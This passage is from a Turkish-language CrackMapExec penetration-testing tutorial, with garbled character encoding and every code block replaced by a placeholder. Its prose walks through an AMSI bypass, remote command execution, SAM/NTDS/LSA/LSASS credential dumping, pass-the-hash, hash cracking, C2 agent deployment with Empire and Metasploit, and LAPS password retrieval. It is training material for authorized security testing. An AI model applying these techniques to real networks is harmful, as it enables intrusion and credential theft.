* Bu sorunu Ã§Ã¶zmek iÃ§in, `shantanukhande-amsi.ps1` dosyasÄ±nÄ± indiren ve Ã§alÄ±ÅŸtÄ±ran bir PowerShell scripti oluÅŸturalÄ±m. AyrÄ±ca scriptimizi barÄ±ndÄ±rmak iÃ§in bir Python web sunucusu oluÅŸturmamÄ±z gerekecek.

### PowerShell Komut DosyasÄ±nÄ± OluÅŸturma ve BarÄ±ndÄ±rma

{{CODE_BLOCK_158}}


Not: Sonuna noktalÄ± virgÃ¼l (;) eklediÄŸinizden emin olun.

BaÅŸka bir terminalden, yeni AMSI bypass payload'umuzu Ã§alÄ±ÅŸtÄ±ralÄ±m:

### PowerShell Ã–zel AMSI Bypass Kullanma

{{CODE_BLOCK_159}}


### WinRM Kullanarak Komut YÃ¼rÃ¼tme

WinRM protokolÃ¼ ile de komutlarÄ± Ã§alÄ±ÅŸtÄ±rabiliriz. VarsayÄ±lan olarak WinRM, HTTP TCP port `5985` ve HTTPS TCP port `5986`'yÄ± dinler. Bu protokolle ilgili Ã¶zel bir ÅŸey, bir kullanÄ±cÄ±nÄ±n komutlarÄ± yÃ¼rÃ¼tmek iÃ§in `administrator` olmasÄ±nÄ± gerektirmemesidir. `Administrators` grubunun Ã¼yesiysek, `Remote Management Users` grubunun Ã¼yesiysek veya oturum yapÄ±landÄ±rmasÄ±nda aÃ§Ä±k `PowerShell Remoting` izinlerimiz varsa WinRM protokolÃ¼nÃ¼ kullanabiliriz.

### Command Execution using WinRM

{{CODE_BLOCK_160}}


### WinRM aracÄ±lÄ±ÄŸÄ±yla PowerShell Komut YÃ¼rÃ¼tme

{{CODE_BLOCK_161}}

### Other PowerShell Options

WinRM komut yÃ¼rÃ¼tme ile kullanabileceÄŸimiz Ã§eÅŸitli seÃ§enekler vardÄ±r. Bunlardan bazÄ±larÄ±nÄ± gÃ¶relim:

| SeÃ§enek           | AÃ§Ä±klama                                                |
| ----------------- | ------------------------------------------------------- |
| --port PORT       | WinRM baÄŸlantÄ±sÄ± iÃ§in Ã¶zel bir port seÃ§mek.             |
| --ssl             | SSL etkinleÅŸtirilmiÅŸ WinRM'ye baÄŸlanmak.                |
| --ignore-ssl-cert | SSL ile baÄŸlanÄ±rken sertifika doÄŸrulamasÄ±nÄ± yok saymak. |

Not: WinRM protokolÃ¼ farklÄ± yÃ¼rÃ¼tme yÃ¶ntemlerini desteklemez.

### SSH Command Execution

CrackMapExec kullanarak Linux veya Windows Ã¼zerinde komutlarÄ± Ã§alÄ±ÅŸtÄ±rmak iÃ§in SSH protokolÃ¼nÃ¼ de kullanabiliriz.

### Command Execution with SSH

{{CODE_BLOCK_162}}

Bir SSH sunucusuyla etkileÅŸime girmenin bir baÅŸka yaygÄ±n yolu da `public` ve `private` keyleri kullanmaktÄ±r. CrackMapExec, `--key-file` seÃ§eneÄŸi ile `private key` kullanÄ±mÄ±nÄ± destekler. AnahtarÄ±n Ã§alÄ±ÅŸmasÄ± iÃ§in `OPENSSH` formatÄ±nda olmasÄ± gerekir.

### Private Key Kullanarak SSH ile Komut YÃ¼rÃ¼tme

{{CODE_BLOCK_163}}

Not: Herhangi bir parola yapÄ±landÄ±rÄ±lmamÄ±ÅŸsa, `-p` seÃ§eneÄŸini boÅŸ `(â€œâ€)` olarak ayarlamalÄ±yÄ±z, aksi takdirde bir hata alÄ±rÄ±z

Bu bÃ¶lÃ¼mde, CrackMapExec kullanarak komutlarÄ± yÃ¼rÃ¼tmek iÃ§in Ã¼Ã§ farklÄ± protokol keÅŸfettik ve daha Ã¶nce komutlarÄ± yÃ¼rÃ¼tmek iÃ§in MSSQL'in nasÄ±l kullanÄ±lacaÄŸÄ±nÄ± tartÄ±ÅŸtÄ±k. YazÄ±m sÄ±rasÄ±nda, CrackMapExec komutlarÄ± yÃ¼rÃ¼tmek iÃ§in diÄŸer dÃ¶rt protokolÃ¼ desteklemektedir. Bir sonraki bÃ¶lÃ¼mde CrackMapExec'in kimlik bilgilerini ayÄ±klamak iÃ§in nasÄ±l kullanÄ±lacaÄŸÄ± tartÄ±ÅŸÄ±lacaktÄ±r.


### Gizli Bilgileri Bulma ve Kullanma

Parola Ã§Ä±karma sÃ¶z konusu olduÄŸunda, CrackMapExec oldukÃ§a gÃ¼Ã§lÃ¼dÃ¼r. On workstation ele geÃ§irdiÄŸimizi ve tÃ¼mÃ¼nden kimlik bilgilerini almak iÃ§in LSASS process'inin belleÄŸini dump istediÄŸimizi dÃ¼ÅŸÃ¼nelim; CrackMapExec bunu yapabilir.

Bu bÃ¶lÃ¼mde, CrackMapExec'in Windows kimlik bilgilerini dump iÃ§in sunduÄŸu yÃ¶ntemleri inceleyeceÄŸiz.


### SAM

SAM database, tÃ¼m local kullanÄ±cÄ±larÄ±n kimlik bilgilerini iÃ§erir ve birÃ§ok administrator local kimlik bilgilerini birden fazla makinede yeniden kullandÄ±ÄŸÄ± iÃ§in bunlarÄ± ele geÃ§irmek kritik Ã¶neme sahiptir. `SMB` ve `WinRM` protokolleriyle kullanÄ±labilen `--sam` seÃ§eneÄŸini kullanarak SAM database iÃ§eriÄŸini hÄ±zlÄ± bir ÅŸekilde alabiliriz.

### Dumping SAM

{{CODE_BLOCK_164}}


### NTDS Active Directory Database

Kimlik bilgilerinin alÄ±nabileceÄŸi bir baÅŸka yer de Active Directory veritabanÄ±dÄ±r. ntds.dit dosyasÄ±, kullanÄ±cÄ± objeleri, gruplar ve grup Ã¼yeliÄŸi hakkÄ±ndaki bilgiler de dahil olmak Ã¼zere Active Directory verilerini depolayan bir veritabanÄ±dÄ±r. Ã–zellikle, dosya aynÄ± zamanda domain'deki tÃ¼m kullanÄ±cÄ±lar iÃ§in parola hash'lerini de saklar (ve hatta bazen bir veya daha fazla hesap iÃ§in [reversible encryption](https://learn.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption) etkinleÅŸtirilmiÅŸse aÃ§Ä±k metin parolalarÄ±nÄ± da saklar). Bir Domain Admin hesabÄ±na veya bir replikasyon/DCSync gerÃ§ekleÅŸtirme ayrÄ±calÄ±klarÄ±na sahip baÅŸka bir hesaba eriÅŸimimiz varsa, bir Domain Controller'dan hash'leri dÃ¶kebiliriz

Hash'leri dump etmek iÃ§in `--ntds` seÃ§eneÄŸini kullanmamÄ±z gerekir, aÅŸaÄŸÄ±daki Ã¶rnekte `robert` kullanÄ±cÄ±sÄ± bir Domain Admin deÄŸildir, ancak `replikasyon` gerÃ§ekleÅŸtirme ayrÄ±calÄ±klarÄ±na sahiptir.

### Domain Controller Ã¼zerinden NTDS database dump etme

{{CODE_BLOCK_165}}

`--ntds` seÃ§eneÄŸini kullanÄ±rken `--user` ve `--enabled` seÃ§eneklerini dahil edebiliriz. EÄŸer `--user` kullanÄ±rsak ayÄ±klamak istediÄŸimiz kullanÄ±cÄ±yÄ± belirtebiliriz. KRBTGT hesabÄ± iÃ§in hash dump alalÄ±m.

### YalnÄ±zca KRBTGT HesabÄ±nÄ±n Dump Edilmesi

{{CODE_BLOCK_166}}

EÄŸer `--enabled` olarak belirtirsek, sadece ekranda `etkin` olan kullanÄ±cÄ±larÄ± gÃ¶sterecek ve bize etkin kullanÄ±cÄ±larÄ±n listesini Ã§Ä±karma seÃ§eneÄŸi sunacaktÄ±r.


### YalnÄ±zca Enabled HesaplarÄ± GÃ¶sterme

{{CODE_BLOCK_167}}


### Secrets (hash'leri) kullanma

Elde ettiÄŸimiz ÅŸifreler NTLM hash'leridir. Hash'leri kÄ±rmayÄ± deneyebilir veya parolayÄ± kÄ±rmadan kullanÄ±cÄ± olarak kimlik doÄŸrulamasÄ± yapmak iÃ§in `Pass the Hash` tekniÄŸini kullanabiliriz. 

CrackMapExec, parola yerine kimlik doÄŸrulama yÃ¶ntemi olarak bir NTLM hash'i gerektiren `-H` seÃ§eneÄŸine sahiptir:

### Using NTLM Hashes

{{CODE_BLOCK_168}}

NTLM kimlik doÄŸrulamasÄ± SMB, WinRM , RDP, LDAP ve MSSQL protokolleri iÃ§in desteklenir


### LSA Secrets/Cached Credentials

CrackMapExec, remote makineden herhangi bir agent Ã§alÄ±ÅŸtÄ±rmadan hash dump iÅŸlemi gerÃ§ekleÅŸtiren `impacket-secretsdump`'tan alÄ±nmÄ±ÅŸ `--lsa` seÃ§eneÄŸiyle birlikte gelir. Bu seÃ§enek, Cached credentials, local machine key list, [Data Protection API (DPAPI)](https://en.wikipedia.org/wiki/Data_Protection_API) keys ve service credentials dahil olmak Ã¼zere LSA Secrets'Ä± dump eder.

`LSA Secrets`, Windows'ta Local Security Authority (LSA) tarafÄ±ndan kullanÄ±lan kritik veriler iÃ§in benzersiz bir korumalÄ± depolama alanÄ±dÄ±r. LSA, bir sistemin local security policy'sini yÃ¶netmek, denetlemek, kimlik doÄŸrulamak, kullanÄ±cÄ±larÄ±n sistemde oturumunu aÃ§mak, Ã¶zel verileri depolamak vb. iÃ§in tasarlanmÄ±ÅŸtÄ±r. KullanÄ±cÄ±larÄ±n ve sistemlerin hassas verileri gizli dosyalarda saklanÄ±r. [DPAPI](https://en.wikipedia.org/wiki/Data_Protection_API) anahtarlarÄ± verileri ÅŸifrelemek iÃ§in kullanÄ±lÄ±r


### LSA'yÄ± inceleyin
{{CODE_BLOCK_169}}


`DCC2$` ile baÅŸlayan hash formatÄ± `Domain Cached Credentials 2 (DCC2)`, MS Cache 2'dir. Bu hash'ler, zayÄ±f bir parola belirlenmiÅŸse `Hashcat` kullanÄ±larak kÄ±rÄ±labilir Ã§Ã¼nkÃ¼ bu algoritma `NTLM`'den Ã§ok daha gÃ¼Ã§lÃ¼dÃ¼r. AyrÄ±ca, Domain Cached Credential hash'leri `Pas the Hash` saldÄ±rÄ±sÄ± iÃ§in kullanÄ±lamaz. BunlarÄ± kÄ±rmak iÃ§in, domain ve kullanÄ±cÄ± adÄ±nÄ± kaldÄ±rmamÄ±z, `$DCC2$` 'den sonraki deÄŸeri almamÄ±z ve Hashcat modÃ¼l 2100'Ã¼ kullanmamÄ±z gerekir.


### Cracking Hashes

{{CODE_BLOCK_170}}


{{CODE_BLOCK_171}}


### LSASS'tan Secrets elde etme

LSASS prosesinin belleÄŸi, Windows parolalarÄ±nÄ± `aÃ§Ä±k metin` olarak veya `NTLM` veya `AES256/AES128` gibi diÄŸer hash biÃ§imlerini iÃ§erir. BelleÄŸi dump etmek, bir domain administrator bulana kadar daha fazla hesap bulmak iÃ§in etkili bir yol olabilir.

CrackMapExec, LSASS process belleÄŸinin iÃ§eriÄŸini dump etmek iÃ§in Ã§eÅŸitli modÃ¼ller iÃ§erir. Bunlardan bazÄ±larÄ±nÄ± gÃ¶relim:

* [Lsassy](https://github.com/login-securite/lsassy) Python aracÄ±, bir dizi host Ã¼zerindeki kimlik bilgilerini remote olarak ayÄ±klamak iÃ§in kullanÄ±lÄ±r. Bu [blog](https://en.hackndo.com/remote-lsass-dump-passwords/) yazÄ±sÄ± nasÄ±l Ã§alÄ±ÅŸtÄ±ÄŸÄ±nÄ± aÃ§Ä±klamaktadÄ±r. Bu araÃ§, bir LSASS dump'Ä±ndaki gerekli baytlarÄ± remote okumak iÃ§in `Impacket` projesini ve kimlik bilgilerini Ã§Ä±karmak iÃ§in `pypykatz` kullanÄ±r.


### Lsassy Module

{{CODE_BLOCK_172}}

* Procdump, LSASS process dump oluÅŸturmak iÃ§in Sysinternals'tan Microsoft `Procdump`'Ä± ve kimlik bilgilerini Ã§Ä±karmak iÃ§in `pypykatz`'Ä± kullanÄ±r.


### Procdump Module

{{CODE_BLOCK_173}}


* **[HandleKatz](https://github.com/codewhitesec/HandleKatz)** aracÄ±, **LSASS**'e ait kopyalanmÄ±ÅŸ **handle**'larÄ±n kullanÄ±mÄ±nÄ± gÃ¶stererek, aynÄ± **process**'in **gizlenmiÅŸ** bir bellek dump'Ä±nÄ± oluÅŸturur.


### Handlekatz Module

{{CODE_BLOCK_174}}


* **[Nanodump](https://github.com/helpsystems/nanodump)**, **LSASS process**'inin **minidump**'Ä±nÄ± oluÅŸturan esnek bir araÃ§tÄ±r. **LSASS**'e bir **handle** aÃ§mak tespit edilebileceÄŸinden, **Nanodump** mevcut **handle**'larÄ± arayabilir. EÄŸer bir **handle** bulunursa, bunu kopyalayÄ±p **minidump** oluÅŸturmak iÃ§in kullanÄ±r. Ancak, bÃ¶yle bir **handle** bulunacaÄŸÄ±nÄ±n garantisi yoktur.

Not : **Handle**, bir **process**'in **dosya, bellek bÃ¶lgesi veya baÅŸka bir kaynak** ile etkileÅŸime geÃ§mesini saÄŸlayan **benzersiz bir tanÄ±mlayÄ±cÄ±dÄ±r**.

### Nanodump Module

{{CODE_BLOCK_175}}

Bu bÃ¶lÃ¼mde bir bilgisayardan veya domain'den kimlik bilgilerini almak iÃ§in farklÄ± yÃ¶ntemler gÃ¶sterilmektedir. Bir sonraki bÃ¶lÃ¼mde CrackMapExec'in bir C2 framework ile birlikte kullanÄ±mÄ± incelenecektir.

---


### Bir **C2 Framework** iÃ§inde **session**'larÄ± alma.

CrackMapExec ile ilginÃ§ olabilecek bir ÅŸey, birden fazla hedefi tehlikeye attÄ±ÄŸÄ±mÄ±zda, daha fazla recon yapmak veya `Empire` veya `Metasploit` gibi bir C2 Framework kullanarak Ã§alÄ±ÅŸmak isteyebiliriz. Her hedef makinede bir payload Ã§alÄ±ÅŸtÄ±rmak ve C2'mize bir `agent` almak iÃ§in CrackMapExec'i kullanabiliriz.

Bu bÃ¶lÃ¼mde CME'yi PowerShell Empire ve Metasploit framework ile entegre eden iki modÃ¼l ele alÄ±nacaktÄ±r. AyrÄ±ca farklÄ± bir C2 framework'Ã¼ kullanÄ±rsak bir alternatif de keÅŸfedeceÄŸiz.


### Empire

Web sitelerinde saÄŸlanan [kÄ±lavuzu](https://bc-security.gitbook.io/empire-wiki/quickstart/installation) kullanarak [Empire framework](https://github.com/BC-SECURITY/Empire)'Ã¼ yÃ¼kleyerek baÅŸlayacaÄŸÄ±z


### Empire Server'Ä± Kurun ve BaÅŸlatÄ±n

{{CODE_BLOCK_176}}

Daha sonra Empire'Ä± seÃ§tiÄŸimiz kullanÄ±cÄ± adÄ± ve ÅŸifre ile Ã§alÄ±ÅŸtÄ±rmamÄ±z gerekiyor. Biz `empireadmin` kullanÄ±cÄ± adÄ±nÄ± ve `asdasd123` ÅŸifresini kullanacaÄŸÄ±z! .


### Empire'Ä± Ã–zel KullanÄ±cÄ± AdÄ± ve Parola ile Ã‡alÄ±ÅŸtÄ±rma

{{CODE_BLOCK_177}}

ArdÄ±ndan, CrackMapExec yapÄ±landÄ±rma dosyasÄ±nÄ± ve Empire client yapÄ±landÄ±rma dosyasÄ±nÄ± seÃ§tiÄŸimiz kullanÄ±cÄ± adÄ± ve parolayla eÅŸleÅŸecek ÅŸekilde dÃ¼zenlememiz gerekir.

CrackMapExec yapÄ±landÄ±rma dosyasÄ± varsayÄ±lan olarak `~/.cme/cme.conf` adresinde bulunur. `[Empire]` seÃ§eneÄŸini `empireadmin` kullanÄ±cÄ± adÄ± ve `asdasd123` ÅŸifresiyle eÅŸleÅŸecek ÅŸekilde deÄŸiÅŸtirmemiz gerekiyor! . VarsayÄ±lan olarak, Empire local server `1337` portunda Ã§alÄ±ÅŸÄ±r. CrackMapExec yapÄ±landÄ±rma dosyasÄ±nda deÄŸiÅŸtirilebilir.


### CrackMapExec Configuration File

{{CODE_BLOCK_178}}


AynÄ± ÅŸeyi Empire yapÄ±landÄ±rma dosyasÄ± iÃ§in de yapmamÄ±z gerekiyor. Dosya `empire/client/config.yaml` adresinde bulunur:


### Ä°nceleme

{{CODE_BLOCK_179}}


YapÄ±landÄ±rma dosyalarÄ± deÄŸiÅŸtirildikten sonra, Empire client ile Empire sunucusuna baÄŸlanmalÄ±yÄ±z

{{CODE_BLOCK_180}}

Åimdi listener'Ä± ayarlamamÄ±z gerekiyor ve host'u IP adresimize ve Port'u da aracÄ±nÄ±n baÄŸlanacaÄŸÄ± TCP 8001'e ayarlayacaÄŸÄ±z.

### Empire Client Connection

{{CODE_BLOCK_181}}


### Empire Setting up IP and Port

{{CODE_BLOCK_182}}

ArtÄ±k listener'Ä±mÄ±z Ã§alÄ±ÅŸÄ±yor ve `empire_exec` modÃ¼lÃ¼ ile Empire'a bir `agent` almak iÃ§in CrackMapExec'i kullanabiliriz. AyarladÄ±ÄŸÄ±mÄ±z listener olan `LISTENER=http` seÃ§eneÄŸini eklememiz gerekiyor.


### CrackMapExec ModÃ¼lÃ¼nÃ¼ Kullanma empire_exec

{{CODE_BLOCK_183}}


Bunu Ã§alÄ±ÅŸtÄ±rdÄ±ÄŸÄ±mÄ±zda, PowerShell Empire'da yeni bir agent gÃ¶rmeliyiz.

![Pasted image 20241203121035.png](/img/user/resimler/Pasted%20image%2020241203121035.png)


### Metasploit

AynÄ± ÅŸeyi CrackMapExec modÃ¼lÃ¼ `web_delivery` kullanarak Metasploit Framework Ã¼zerinde de yapabiliriz. Metasploit Framework'te `web_delivery` modÃ¼lÃ¼nÃ¼ yapÄ±landÄ±rmamÄ±z ve saÄŸlanan URL'yi CrackMapExec modÃ¼lÃ¼mÃ¼ze bir parametre olarak kullanmamÄ±z gerekir. Msfconsole'u baÅŸlatalÄ±m ve `web_delivery` handler'Ä±nÄ± yapÄ±landÄ±ralÄ±m


### Metasploit Configure web_delivery Handler

{{CODE_BLOCK_184}}

Metasploit'te web delivery handler yapÄ±landÄ±rÄ±ldÄ±ktan sonra web_delivery modÃ¼lÃ¼nÃ¼ kullanabiliriz. `URL` ve `PAYLOAD` olmak Ã¼zere iki seÃ§eneÄŸi destekler. URL seÃ§eneÄŸini Metasploit tarafÄ±ndan saÄŸlanan URL ile ayarlamamÄ±z gerekir ve PAYLOAD seÃ§eneÄŸi seÃ§tiÄŸimiz payload mimarisine karÅŸÄ±lÄ±k gelir. EÄŸer `x64` kullanÄ±yorsak, `x64` varsayÄ±lan deÄŸer olduÄŸu iÃ§in bu seÃ§eneÄŸi atlayabiliriz ya da `PAYLOAD=64` kullanabiliriz. EÄŸer `32 bit` payload kullanÄ±yorsak `PAYLOAD=32` seÃ§eneÄŸini ayarlamamÄ±z gerekir. Åimdi bunu Ã§alÄ±ÅŸÄ±rken gÃ¶relim:


### CrackMapExec web_delivery Module

{{CODE_BLOCK_185}}

{{CODE_BLOCK_186}}

Metasploit'te yeni bir oturum gÃ¶rmeliyiz:

![Pasted image 20241203121353.png](/img/user/resimler/Pasted%20image%2020241203121353.png)


### Other C2 Frameworks

BaÅŸka bir C2 Framework kullanmak istediÄŸimizde, **Command Execution** bÃ¶lÃ¼mÃ¼nde bahsedilen (SMB, WinRM, SSH) yÃ¶ntemleri kullanarak aynÄ± sonucu elde edebiliriz. Ã–rneÄŸin, bir **PowerShell** payload'u oluÅŸturabilir, bu payload'u bir web sunucusuna kaydedebilir ve payload'u indirip Ã§alÄ±ÅŸtÄ±rmak iÃ§in **-X** seÃ§eneÄŸiyle bir PowerShell komutu Ã§alÄ±ÅŸtÄ±rabiliriz. AyrÄ±ca, iÅŸlemi arka planda yÃ¼rÃ¼tmek iÃ§in **`--no-output`** seÃ§eneÄŸini seÃ§memiz gerekecektir.

Ã–rnek olarak Metasploit'i kullanalÄ±m ve modÃ¼lÃ¼ kullanmak yerine web_delivery payload'unda saÄŸlanan PowerShell script'ini kopyalamayÄ± deneyelim:

![Pasted image 20241203122258.png](/img/user/resimler/Pasted%20image%2020241203122258.png)

Bu bÃ¶lÃ¼m, CrackMapExec'i C2 Frameworks gibi diÄŸer bilgisayar korsanlÄ±ÄŸÄ± araÃ§larÄ±yla nasÄ±l kullanabileceÄŸimizi araÅŸtÄ±rÄ±yor. Bir sonraki bÃ¶lÃ¼mde CrackMapExec'in BloodHound ile nasÄ±l entegre edileceÄŸi incelenecektir.


---

### Bloodhound Entegrasyonu

BloodHound, hem saldÄ±rganlar hem de savunmacÄ±lar tarafÄ±ndan alan gÃ¼venliÄŸini analiz etmek iÃ§in kullanÄ±lan aÃ§Ä±k kaynaklÄ± bir araÃ§tÄ±r. AraÃ§, domain'den toplanan bÃ¼yÃ¼k miktarda veriyi alÄ±r. Ä°liÅŸkiyi gÃ¶rsel olarak temsil etmek ve geleneksel numaralandÄ±rma ile tespit edilmesi zor veya imkansÄ±z olan domain saldÄ±rÄ± yollarÄ±nÄ± belirlemek iÃ§in grafik teorisini kullanÄ±r. Bu bÃ¶lÃ¼mde Bloodhound'a aÅŸina olduÄŸunuzu varsayÄ±yoruz. 


### **BloodHound**'da **Owned** olarak iÅŸaretleme.

BloodHound'da bir Node'u (user, grup, computer vb.) manuel olarak ele geÃ§irilmiÅŸ (owned) olarak iÅŸaretleyebiliriz. Bunu yapmak iÃ§in node'a saÄŸ tÄ±klayÄ±p **`Mark X as Owned`** seÃ§eneÄŸine tÄ±klamamÄ±z yeterlidir. Bu, ele geÃ§irdiÄŸimiz kullanÄ±cÄ±larÄ± ve bilgisayarlarÄ± takip etmek aÃ§Ä±sÄ±ndan faydalÄ±dÄ±r, Ã¶zellikle bÃ¼yÃ¼k bir organizasyonla Ã§alÄ±ÅŸÄ±rken. AyrÄ±ca, **`Shortest Path from Owned Principals`** (Ele GeÃ§irilmiÅŸ Principal'dan En KÄ±sa Yol) veya **`Shortest Paths to Domain Admins from Owned Principals`** (Ele GeÃ§irilmiÅŸ Principal'dan Domain Adminlerine En KÄ±sa Yollar) gibi bir BloodHound cypher sorgusu gerÃ§ekleÅŸtirmek istediÄŸimizde de kullanÄ±ÅŸlÄ±dÄ±r.

CrackMapExec'i, ele geÃ§irdiÄŸimiz herhangi bir user veya computer'Ä± BloodHound veritabanÄ±nda `owned` olarak iÅŸaretleyecek ÅŸekilde yapÄ±landÄ±rabiliriz. Bunu yapmak iÃ§in, `~/.cme/cme.conf` adresinde bulunan CrackMapExec yapÄ±landÄ±rma dosyasÄ±nÄ± aÅŸaÄŸÄ±daki seÃ§eneklerle deÄŸiÅŸtirmemiz gerekir:

* Bloodhound yapÄ±landÄ±rma seÃ§eneÄŸi `bh_enabled`'Ä± `True` olarak ayarlayÄ±n.
* `bh_uri`'yi Bloodhound veritabanÄ± `IP` adresimize ayarlayÄ±n.
* `bh_port`'u veritabanÄ± `portuna` ayarlayÄ±n
* Kimlik bilgilerini bloodhound veritabanÄ±yla eÅŸleÅŸecek ÅŸekilde ayarlayÄ±n: kullanÄ±cÄ± adÄ± `neo4j` ve ÅŸifre `asdasd123` (VeritabanÄ±nÄ±za karÅŸÄ±lÄ±k geleni kullandÄ±ÄŸÄ±nÄ±zdan emin olun).

YapÄ±landÄ±rma aÅŸaÄŸÄ±daki gibi gÃ¶rÃ¼nmelidir:


### Configuring BloodHound Database

{{CODE_BLOCK_187}}

Not: BaÄŸlandÄ±ÄŸÄ±nÄ±z BloodHound veritabanÄ±na karÅŸÄ±lÄ±k gelen kullanÄ±cÄ± adÄ± ve parolayÄ± kullandÄ±ÄŸÄ±nÄ±zdan emin olun.

### Bloodhound Verilerinin ToplanmasÄ±

BloodHound verilerini toplamak iÃ§in CrackMapExec kullanarak SharpHound'u Ã§alÄ±ÅŸtÄ±racak ve ardÄ±ndan dosyayÄ± saldÄ±rÄ± hostumuza aktaracaÄŸÄ±z.

### BloodHound verilerinin toplanmasÄ±

{{CODE_BLOCK_188}}

{{CODE_BLOCK_189}}

{{CODE_BLOCK_190}}

{{CODE_BLOCK_191}}

Åimdi BloodHound'u aÃ§mamÄ±z ve verileri iÃ§e aktarmamÄ±z gerekiyor.


### BloodHound'da KullanÄ±cÄ±larÄ± Owned Olarak Ayarlama

Veriler iÃ§e aktarÄ±ldÄ±ktan sonra, `robert` kullanÄ±cÄ±sÄ± ile baÄŸlanmaya Ã§alÄ±ÅŸÄ±rsak, kullanÄ±cÄ±yÄ± BloodHound veritabanÄ±nda owned olunan olarak ayarlayacaktÄ±r.

### KullanÄ±cÄ± BloodHound'da Owned Olarak Eklendi

{{CODE_BLOCK_192}}

Birden fazla kullanÄ±cÄ±sÄ± olan bir makineyi tehlikeye atarsak da aynÄ± ÅŸey olacaktÄ±r. Bulunan tÃ¼m yeni kullanÄ±cÄ±larÄ± owned olarak ayarlayacaktÄ±r.

### Procdump ModÃ¼lÃ¼ ile KullanÄ±cÄ±larÄ± Owned Olarak Ekleme

{{CODE_BLOCK_193}}


Not: TÃ¼m CrackMapExec seÃ§enekleri BloodHound veritabanÄ± ile senkronize olmayacaktÄ±r. Ã–rneÄŸin, `--ntds` veya `--lsa` seÃ§eneklerini denersek, kullanÄ±cÄ±larÄ± veritabanÄ±nda sahip olunan olarak iÅŸaretlemez, ancak `procdump` veya `lsassy` gibi modÃ¼ller kullanÄ±cÄ±larÄ± sahip olunan olarak iÅŸaretler.


### BloodHound'da BilgisayarlarÄ± Owned Olarak Ayarlama

YazÄ±m sÄ±rasÄ±nda, BloodHound entegrasyonu yalnÄ±zca user'larÄ± Owned olarak iÅŸaretlemektedir. Bir `computer` owned olarak iÅŸaretlemek istiyorsak, `bh_owned` modÃ¼lÃ¼nÃ¼ ve `neo4j` veritabanÄ±mÄ±zÄ±n kullanÄ±cÄ± adÄ± ve ÅŸifresini kullanabiliriz. AÅŸaÄŸÄ±daki Ã¶rnekte, diÄŸer varsayÄ±lan deÄŸerler neo4j veritabanÄ±mÄ±zla eÅŸleÅŸtiÄŸi iÃ§in yalnÄ±zca `PASS` seÃ§eneÄŸini ekleyeceÄŸiz.

{{CODE_BLOCK_194}}

{{CODE_BLOCK_195}}

BloodHound'un CrackMapExec'e entegrasyonu, bÃ¼yÃ¼k aÄŸlarla uÄŸraÅŸÄ±rken birÃ§ok seÃ§enek sunar ve mÃ¼ÅŸterilerimizle paylaÅŸmak istememiz durumunda veritabanÄ±nÄ± gÃ¼ncellemenin hÄ±zlÄ± bir yoludur. Bir sonraki bÃ¶lÃ¼mde, CrackMapExec'te mevcut olan bazÄ± popÃ¼ler modÃ¼llerle Ã§alÄ±ÅŸacaÄŸÄ±z.


----
### Popular Modules

CrackMapExec ile ilgili en heyecan verici ÅŸeylerden biri, modÃ¼ler olmasÄ± ve herkesin modÃ¼ller oluÅŸturmasÄ±na ve bunlarÄ± araca katkÄ±da bulunmasÄ±na izin vermesidir. CrackMapExec, exploit ve exploit sonrasÄ± gÃ¶revleri kolaylaÅŸtÄ±rmak iÃ§in iÅŸlemler gerÃ§ekleÅŸtirmemizi saÄŸlayan 50'den fazla modÃ¼le sahiptir. Bu bÃ¶lÃ¼mde LDAP ve SMB protokolleri iÃ§in bu modÃ¼llerden bazÄ±larÄ± incelenecektir.


### LDAP Protocol Modules

LDAP protokolÃ¼ yaygÄ±n olarak Domain Controller'lar ile etkileÅŸime geÃ§memizi ve onlardan bilgi almamÄ±zÄ± saÄŸlar. Active Directory'den ilginÃ§ bilgiler Ã§Ä±karmamÄ±zÄ± saÄŸlayacak bazÄ± modÃ¼lleri gÃ¶zden geÃ§irelim.


### **LDAP Module - get-network**

`get-network` modÃ¼lÃ¼ [Active Directory Integrated DNS dump](https://github.com/dirkjanm/adidnsdump)'Ä±  temel alÄ±r. VarsayÄ±lan olarak, Active Directory'deki herhangi bir kullanÄ±cÄ±, `zone transferine` benzer ÅŸekilde Domain veya Forest DNS bÃ¶lgelerindeki tÃ¼m DNS kayÄ±tlarÄ±nÄ± numaralandÄ±rabilir. Bu araÃ§, internal aÄŸlarÄ±n yeniden yapÄ±landÄ±rÄ±lmasÄ± amacÄ±yla bÃ¶lgedeki tÃ¼m DNS kayÄ±tlarÄ±nÄ±n numaralandÄ±rÄ±lmasÄ±nÄ± ve dÄ±ÅŸa aktarÄ±lmasÄ±nÄ± saÄŸlar.

ModÃ¼lÃ¼ kullanmanÄ±n Ã¼Ã§ (3) yolu vardÄ±r:
* Sadece IP adresini almak.
* Sadece domain isimlerini al.
* Her ikisini de al (IP ve domain adlarÄ±).

VarsayÄ±lan olarak, herhangi bir seÃ§enek belirtmezsek, modÃ¼l yalnÄ±zca IP adresini alacaktÄ±r. `ALL=true` seÃ§eneÄŸini seÃ§ersek, hem IP hem de domain adlarÄ±nÄ± alÄ±r ve `ONLY_HOSTS=true` olarak belirtirsek, yalnÄ±zca FQDN'yi alÄ±rÄ±z.


### DNS Sunucusundan (Record) KayÄ±tlarÄ± Alma

{{CODE_BLOCK_196}}

{{CODE_BLOCK_197}}

{{CODE_BLOCK_198}}


Not: Bu yazÄ±nÄ±n yazÄ±ldÄ±ÄŸÄ± zamanda, modÃ¼l **`adidnsdump`** aracÄ±yla bazÄ± farklÄ±lÄ±klar gÃ¶stermektedir. SonuÃ§lar, hesaplar arasÄ±nda farklÄ±lÄ±k gÃ¶sterebilir.


### LDAP Module - laps

Bir baÅŸka harika modÃ¼l de `laps` . `Local Administrator Password Solution (LAPS)`, domain'e baÄŸlÄ± bilgisayarlarda local hesap parolalarÄ±nÄ±n yÃ¶netimini saÄŸlar. Parolalar Active Directory'de (AD) saklanÄ±r ve ACL'ler tarafÄ±ndan korunur, bÃ¶ylece yalnÄ±zca belirli kullanÄ±cÄ±lar bunlarÄ± okuyabilir veya `parola sÄ±fÄ±rlama` talebinde bulunabilir. Laps modÃ¼lÃ¼ ile bir hesabÄ±n okuma eriÅŸimine sahip olduÄŸu tÃ¼m bilgisayarlarÄ± alabiliriz. Bir bilgisayarÄ± belirtmek iÃ§in `COMPUTER` seÃ§eneÄŸini de kullanabilir veya benzer ada sahip birkaÃ§ bilgisayarÄ± almak iÃ§in bir wildcard karakterle birlikte kullanabiliriz.


### LAPS ModÃ¼lÃ¼ ParolalarÄ±n AlÄ±nmasÄ±

{{CODE_BLOCK_199}}

{{CODE_BLOCK_200}}


